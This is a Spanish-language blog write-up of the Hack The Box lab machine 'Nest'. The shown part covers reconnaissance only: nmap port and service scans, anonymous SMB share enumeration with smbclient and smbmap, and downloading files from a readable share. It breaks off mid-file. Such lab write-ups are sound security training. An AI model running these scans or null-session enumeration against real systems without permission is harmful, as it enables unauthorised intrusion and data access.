<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Nest - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Nest en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Nest">
<meta property="og:url" content="http://localhost:4000/htb-nest/">


  <meta property="og:description" content="Resolución de la máquina Nest en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-nest/nest.jpg">





  <meta property="article:published_time" content="2022-01-15T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-nest/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Nest</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Nest">
    <meta itemprop="description" content="Resolución de la máquina Nest en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="January 15, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Nest
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-nest/banner-nest.jpg" alt="" /></p>

<h2 id="nest">Nest</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.178.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.178
PING 10.10.10.178 <span class="o">(</span>10.10.10.178<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.178: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>138 ms

<span class="nt">---</span> 10.10.10.178 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 138.375/138.375/138.375/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.178 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-14 17:07 CST
Initiating SYN Stealth Scan at 17:07
Scanning 10.10.10.178 <span class="o">[</span>65535 ports]
Discovered open port 445/tcp on 10.10.10.178
Discovered open port 4386/tcp on 10.10.10.178
Completed SYN Stealth Scan at 17:07, 26.47s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.178
Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-14 17:07:17 CST <span class="k">for </span>27s
Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT     STATE SERVICE      REASON
445/tcp  open  microsoft-ds syn-ack ttl 127
4386/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.55 seconds
           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>880B<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.178
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 445,4386
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p445</span>,4386 10.10.10.178 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-14 17:12 CST
Stats: 0:02:10 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Service Scan
Service scan Timing: About 50.00% <span class="k">done</span><span class="p">;</span> ETC: 17:16 <span class="o">(</span>0:02:09 remaining<span class="o">)</span>                                                           Nmap scan report <span class="k">for </span>10.10.10.178          
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>                                                                                                      
                                                                                                                                 
PORT     STATE SERVICE       VERSION                                                                                             
445/tcp  open  microsoft-ds?                                                                                                     
4386/tcp open  unknown                                                                                                           
| fingerprint-strings:                                                                                                           
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBPr
ogNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2                                                                                                     
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2                                                                                                     
|     Unrecognised <span class="nb">command</span>                                                                                                       
|   Help:                                                                                                                        
|     Reporting Service V1.2                                                                                                     
|     This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS <span class="nt">---</span>                                                                                                     
|     LIST                                                                                                                       
|     SETDIR &lt;Directory_Name&gt;                                                                                                    
|     RUNQUERY &lt;Query_ID&gt;                                                                                                        
|     DEBUG &lt;Password&gt;                                                                                                           
|_    HELP &lt;Command&gt;                                                                                                             
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
//nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>1/14%Time<span class="o">=</span>61E20351%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GenericLin
SF:es,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognise
SF:d</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">2
SF:0V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,3A,<span class="s2">"</span><span class="se">\r\</span><span class="s2">
SF:nHQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20comma
SF:nd</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\</span><span class="s2">
SF:n</span><span class="se">\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Repo
SF:rting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK
SF:</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,21,<span class="s2">"
SF:</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>Help,F2,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\</span><span class="s2">
SF:x20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">This</span><span class="se">\x</span><span class="s2">20service</span><span class="se">\x</span><span class="s2">20allows</span><span class="se">\</span><span class="s2">
SF:x20users</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20run</span><span class="se">\x</span><span class="s2">20queries</span><span class="se">\x</span><span class="s2">20against</span><span class="se">\x</span><span class="s2">20databases</span><span class="se">\x</span><span class="s2">20using</span><span class="se">\x</span><span class="s2">20th
SF:e</span><span class="se">\x</span><span class="s2">20legacy</span><span class="se">\x</span><span class="s2">20HQK</span><span class="se">\x</span><span class="s2">20format</span><span class="se">\r\n\r\n</span><span class="s2">---</span><span class="se">\x</span><span class="s2">20AVAILABLE</span><span class="se">\x</span><span class="s2">20COMMANDS</span><span class="se">\x</span><span class="s2">20---
SF:</span><span class="se">\r\n\r\n</span><span class="s2">LIST</span><span class="se">\r\n</span><span class="s2">SETDIR</span><span class="se">\x</span><span class="s2">20&lt;Directory_Name&gt;</span><span class="se">\r\n</span><span class="s2">RUNQUERY</span><span class="se">\x</span><span class="s2">20&lt;Query_ID&gt;</span><span class="se">\r\</span><span class="s2">
SF:nDEBUG</span><span class="se">\x</span><span class="s2">20&lt;Password&gt;</span><span class="se">\r\n</span><span class="s2">HELP</span><span class="se">\x</span><span class="s2">20&lt;Command&gt;</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,21,<span class="s2">"</span><span class="se">\r</span><span class="s2">
SF:</span><span class="se">\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCooki
SF:e,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionR
SF:eq,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,2
SF:1,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,21,
SF:<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,21,<span class="s2">"</span><span class="se">\r\</span><span class="s2">
SF:nHQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,3A
SF:,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20
SF:command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2
SF:</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">
SF:2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2
SF:</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3A,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r</span><span class="s2">
SF:</span><span class="se">\n\r\n</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">Unrecognised</span><span class="se">\x</span><span class="s2">20command</span><span class="se">\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">20R
SF:eporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,21,<span class="s2">"</span><span class="se">\r\n</span><span class="s2">HQK</span><span class="se">\x</span><span class="s2">2
SF:0Reporting</span><span class="se">\x</span><span class="s2">20Service</span><span class="se">\x</span><span class="s2">20V1</span><span class="se">\.</span><span class="s2">2</span><span class="se">\r\n\r\n</span><span class="s2">&gt;"</span><span class="o">)</span><span class="p">;</span>

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2022-01-14T23:14:49
|_  start_date: 2022-01-14T22:58:08
|_clock-skew: <span class="nt">-4s</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>202.45 seconds
</code></pre></div></div>

<p>Vemos que la máquina tiene el puerto 445 abierto, así que podriamos tratar de ver si podemos ver recursos con una <strong><em>Null Session</em></strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.178 <span class="nt">-N</span>

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
        C<span class="nv">$ </span>             Disk      Default share
        Data            Disk      
        IPC<span class="nv">$ </span>           IPC       Remote IPC
        Secure<span class="nv">$ </span>        Disk      
        Users           Disk      
SMB1 disabled <span class="nt">--</span> no workgroup available

❯ smbmap <span class="nt">-H</span> 10.10.10.178 <span class="nt">-u</span> <span class="s1">'null'</span>
<span class="o">[</span>+] Guest session       IP: 10.10.10.178:445    Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
        Secure<span class="nv">$ </span>                                                NO ACCESS
        Users                                                   READ ONLY
</code></pre></div></div>

<p>Vemos que contamos con permisos de sólo lectura para los directorios <strong>Data</strong> y <strong>Users</strong> así que vamos a echarles un ojo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Data <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 17:53:46 2019
  ..                                  D        0  Wed Aug  7 17:53:46 2019
  IT                                  D        0  Wed Aug  7 17:58:07 2019
  Production                          D        0  Mon Aug  5 16:53:38 2019
  Reports                             D        0  Mon Aug  5 16:53:44 2019
  Shared                              D        0  Wed Aug  7 14:07:51 2019

                5242623 blocks of size 4096. 1840001 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Shared
smb: <span class="se">\S</span>hared<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:07:51 2019
  ..                                  D        0  Wed Aug  7 14:07:51 2019
  Maintenance                         D        0  Wed Aug  7 14:07:32 2019
  Templates                           D        0  Wed Aug  7 14:08:07 2019

                5242623 blocks of size 4096. 1840001 blocks available
smb: <span class="se">\S</span>hared<span class="se">\&gt;</span> <span class="nb">cd</span> ..
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 17:53:46 2019
  ..                                  D        0  Wed Aug  7 17:53:46 2019
  IT                                  D        0  Wed Aug  7 17:58:07 2019
  Production                          D        0  Mon Aug  5 16:53:38 2019
  Reports                             D        0  Mon Aug  5 16:53:44 2019
  Shared                              D        0  Wed Aug  7 14:07:51 2019

<span class="se">\I</span>T
NT_STATUS_ACCESS_DENIED listing <span class="se">\I</span>T<span class="se">\*</span>

<span class="se">\P</span>roduction
NT_STATUS_ACCESS_DENIED listing <span class="se">\P</span>roduction<span class="se">\*</span>

<span class="se">\R</span>eports
NT_STATUS_ACCESS_DENIED listing <span class="se">\R</span>eports<span class="se">\*</span>

<span class="se">\S</span>hared
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:07:51 2019
  ..                                  D        0  Wed Aug  7 14:07:51 2019
  Maintenance                         D        0  Wed Aug  7 14:07:32 2019
  Templates                           D        0  Wed Aug  7 14:08:07 2019

<span class="se">\S</span>hared<span class="se">\M</span>aintenance
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:07:32 2019
  ..                                  D        0  Wed Aug  7 14:07:32 2019
  Maintenance Alerts.txt              A       48  Mon Aug  5 18:01:44 2019

<span class="se">\S</span>hared<span class="se">\T</span>emplates
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:08:07 2019
  ..                                  D        0  Wed Aug  7 14:08:07 2019
  HR                                  D        0  Wed Aug  7 14:08:01 2019
  Marketing                           D        0  Wed Aug  7 14:08:06 2019

<span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:08:01 2019
  ..                                  D        0  Wed Aug  7 14:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 17:55:36 2019

<span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\M</span>arketing
  <span class="nb">.</span>                                   D        0  Wed Aug  7 14:08:06 2019
  ..                                  D        0  Wed Aug  7 14:08:06 2019
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>Vemos que para el directorio <strong>Data</strong> tenemos algunos archivos que son:</p>

<ul>
  <li>\Shared\Maintenance\Maintenance Alerts.txt</li>
  <li>\Shared\Templates\HR\Welcome Email.txt</li>
</ul>

<p>Asi que vamos a pasarlos a nuestra máquina para ver su contenido.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get <span class="se">\S</span>hared<span class="se">\M</span>aintenance<span class="se">\"</span>Maintenance Alerts.txt<span class="s2">"
getting file </span><span class="se">\S</span><span class="s2">hared</span><span class="se">\M</span><span class="s2">aintenance</span><span class="se">\M</span><span class="s2">aintenance Alerts.txt of size 48 as </span><span class="se">\S</span><span class="s2">hared</span><span class="se">\M</span><span class="s2">aintenance</span><span class="se">\M</span><span class="s2">aintenance Alerts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: </span><span class="se">\&gt;</span><span class="s2"> get </span><span class="se">\S</span><span class="s2">hared</span><span class="se">\T</span><span class="s2">emplates</span><span class="se">\H</span><span class="s2">R</span><span class="se">\"</span><span class="s2">Welcome Email.txt"</span>
getting file <span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R<span class="se">\W</span>elcome Email.txt of size 425 as <span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R<span class="se">\W</span>elcome Email.txt <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>Maintenance<span class="se">\ </span>Alerts.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Maintenance Alerts.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ There is currently no scheduled maintenance work
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ <span class="nb">cat </span>Welcome<span class="se">\ </span>Email.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Welcome Email.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
   2   │ 
   3   │ You will find your home folder <span class="k">in </span>the following location: 
   4   │ <span class="se">\\</span>HTB-NEST<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;
   5   │ 
   6   │ If you have any issues accessing specific services or workstations, please inform the 
